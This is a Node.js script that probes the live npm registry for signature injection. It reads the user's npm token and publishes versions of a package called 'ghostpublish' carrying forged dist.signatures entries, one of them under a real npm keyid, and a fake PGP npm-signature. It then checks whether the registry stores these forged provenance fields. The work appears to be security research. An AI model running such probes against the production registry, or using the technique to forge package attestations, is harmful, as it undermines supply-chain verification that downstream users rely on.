#!/usr/bin/env node
// dist.signatures and dist.npm-signature injection probes.
//
// Tests whether the registry trusts publisher-supplied values for the fields
// it uses to attest tarball provenance. Specifically:
//   - dist.signatures (modern ECDSA, the array used by `npm audit signatures`)
//   - dist.npm-signature (legacy PGP signature, retained on older packages)
//
// Probes:
//   A — inject fake dist.signatures (bogus keyid + bogus sig)
//   B — inject empty dist.signatures: []
//   C — inject fake dist.signatures with a real-looking npm keyid + bogus sig
//   D — inject fake dist.npm-signature (PGP-formatted)

import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execSync } from 'node:child_process'

const REGISTRY = 'https://registry.npmjs.org'
const PKG = 'ghostpublish'
const TS = Math.floor(Date.now() / 1000)

// Real npm signing keyid (from previously-published versions). Used in probe C
// to test whether the registry strips the entry, replaces it, or keeps it.
const REAL_NPM_KEYID = 'SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U'
const FAKE_KEYID = 'SHA256:PROBE_FAKE_KEYID_AAAAAAAAAAAAAAAAAAAAAAAAAA'
const FAKE_SIG = 'MEUCIPROBE_FAKE_SIG_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
const FAKE_PGP = `-----BEGIN PGP SIGNATURE-----
Version: PROBE_FAKE
Comment: PROBE_FAKE_pgp_npm_signature

PROBE_FAKE_PGP_BLOCK_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----END PGP SIGNATURE-----
`

function readToken() {
  for (const p of [path.resolve('.npmrc'), path.join(os.homedir(), '.npmrc')]) {
    try {
      const text = fs.readFileSync(p, 'utf8')
      const m = text.match(/_authToken=([A-Za-z0-9_-]+)/)
      if (m) return m[1].trim()
    } catch {}
  }
  throw new Error('No npm auth token found')
}
const token = readToken()

function buildTarball(version) {
  const stagingDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gh-sigprobe-'))
  const pkgDir = path.join(stagingDir, 'package')
  fs.mkdirSync(pkgDir)
  fs.writeFileSync(
    path.join(pkgDir, 'package.json'),
    JSON.stringify({ name: PKG, version, license: 'MIT', main: 'index.js' }, null, 2),
  )
  fs.writeFileSync(path.join(pkgDir, 'index.js'), `module.exports = { ts: ${TS} };\n`)
  const tarballPath = path.join(stagingDir, `${PKG}-${version}.tgz`)
  execSync(`tar --no-xattrs --format=ustar -czf "${tarballPath}" -C "${stagingDir}" package`, { stdio: 'inherit' })
  const buf = fs.readFileSync(tarballPath)
  return {
    buf,
    sha1: crypto.createHash('sha1').update(buf).digest('hex'),
    integrity: `sha512-${crypto.createHash('sha512').update(buf).digest('base64')}`,
  }
}

async function publish(name, distExtras) {
  const version = `1.0.0-sigprobe-${name}-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const tgzName = `${PKG}-${version}.tgz`

  const dist = {
    tarball: `${REGISTRY}/${PKG}/-/${tgzName}`,
    shasum: sha1,
    integrity,
    ...distExtras,
  }

  const versionManifest = {
    name: PKG,
    version,
    license: 'MIT',
    main: 'index.js',
    _id: `${PKG}@${version}`,
    dist,
  }

  const body = {
    _id: PKG,
    name: PKG,
    description: `dist.signatures probe: ${name}`,
    'dist-tags': { [`sigprobe-${name}`]: version },
    versions: { [version]: versionManifest },
    _attachments: {
      [tgzName]: {
        content_type: 'application/octet-stream',
        data: buf.toString('base64'),
        length: buf.length,
      },
    },
  }

  const t0 = Date.now()
  const res = await fetch(`${REGISTRY}/${PKG}`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: '*/*' },
    body: JSON.stringify(body),
  })
  const text = await res.text()
  return { version, res, text, elapsed: Date.now() - t0 }
}

async function readManifest(version) {
  const r = await fetch(`${REGISTRY}/${PKG}/${version}`, { headers: { accept: 'application/json' } })
  if (!r.ok) return { ok: false, status: r.status, body: await r.text() }
  return { ok: true, manifest: await r.json() }
}

const REPORT = []
function record(probe, sentSummary, storedSummary, verdict, putStatus) {
  REPORT.push({ probe, sentSummary, storedSummary, verdict, putStatus })
}
function logHeader(t) { console.log('\n' + '='.repeat(72) + '\n' + t + '\n' + '='.repeat(72)) }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

// ---- Probe A: inject fake dist.signatures with fake keyid ----
{
  logHeader('PROBE A — fake dist.signatures (fake keyid + fake sig)')
  const out = await publish('fake-array', {
    signatures: [{ keyid: FAKE_KEYID, sig: FAKE_SIG }],
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest.dist.signatures: ${JSON.stringify(m.manifest.dist?.signatures)}`)
    const stored = m.manifest.dist?.signatures?.[0]
    const verdict = !stored ? 'STRIPPED'
      : stored.keyid === FAKE_KEYID ? 'ACCEPTED VERBATIM (FAKE KEYID STORED)'
      : 'OVERRIDDEN with real npm signature'
    record('signatures: fake keyid', `keyid=${FAKE_KEYID.slice(0,30)}...`, stored ? `keyid=${stored.keyid?.slice(0,30)}...` : '<absent>', verdict, out.res.status)
  } else {
    record('signatures: fake keyid', 'fake', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe B: inject empty dist.signatures: [] ----
{
  logHeader('PROBE B — empty dist.signatures: []')
  const out = await publish('empty-array', { signatures: [] })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest.dist.signatures: ${JSON.stringify(m.manifest.dist?.signatures)}`)
    const stored = m.manifest.dist?.signatures
    const verdict = !stored || stored.length === 0 ? 'STORED EMPTY (no auto-add)'
      : 'AUTO-ADDED npm signature anyway'
    record('signatures: []', '[]', JSON.stringify(stored || '<absent>').slice(0, 70), verdict, out.res.status)
  } else {
    record('signatures: []', '[]', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe C: real-looking npm keyid + bogus sig ----
{
  logHeader('PROBE C — real npm keyid + bogus signature')
  const out = await publish('real-keyid-fake-sig', {
    signatures: [{ keyid: REAL_NPM_KEYID, sig: FAKE_SIG }],
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest.dist.signatures: ${JSON.stringify(m.manifest.dist?.signatures)}`)
    const stored = m.manifest.dist?.signatures?.[0]
    const sigMatch = stored?.sig === FAKE_SIG
    const verdict = !stored ? 'STRIPPED'
      : sigMatch ? 'ACCEPTED FAKE SIG VERBATIM (uses real keyid)'
      : 'OVERRIDDEN with real npm signature'
    record('signatures: real-keyid+fake-sig', `keyid=real, sig=${FAKE_SIG.slice(0,20)}...`, stored ? `sig=${stored.sig?.slice(0,30)}...` : '<absent>', verdict, out.res.status)
  } else {
    record('signatures: real-keyid+fake-sig', 'real-keyid', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe D: legacy dist['npm-signature'] ----
{
  logHeader('PROBE D — fake dist["npm-signature"] (legacy PGP)')
  const out = await publish('npm-signature-pgp', { 'npm-signature': FAKE_PGP })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest.dist["npm-signature"]: ${(m.manifest.dist?.['npm-signature'] || '<absent>').slice(0, 80)}...`)
    const stored = m.manifest.dist?.['npm-signature']
    const verdict = !stored ? 'STRIPPED — registry no longer accepts PGP injection'
      : stored.includes('PROBE_FAKE') ? 'ACCEPTED VERBATIM (FAKE PGP STORED)'
      : 'OVERRIDDEN with a different PGP signature'
    record('dist["npm-signature"]', '<fake PGP block>', stored ? '<some PGP>' : '<absent>', verdict, out.res.status)
  } else {
    record('dist["npm-signature"]', '<fake PGP>', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Summary ----
logHeader('SUMMARY')
console.log()
console.log('| Probe                                  | PUT  | Verdict |')
console.log('|----------------------------------------|------|---------|')
for (const r of REPORT) {
  console.log(`| ${r.probe.padEnd(38)} | ${String(r.putStatus).padEnd(4)} | ${r.verdict} |`)
}
console.log()
console.log('Detail:')
for (const r of REPORT) {
  console.log(`  [${r.probe}]`)
  console.log(`    sent:   ${r.sentSummary}`)
  console.log(`    stored: ${r.storedSummary}`)
}
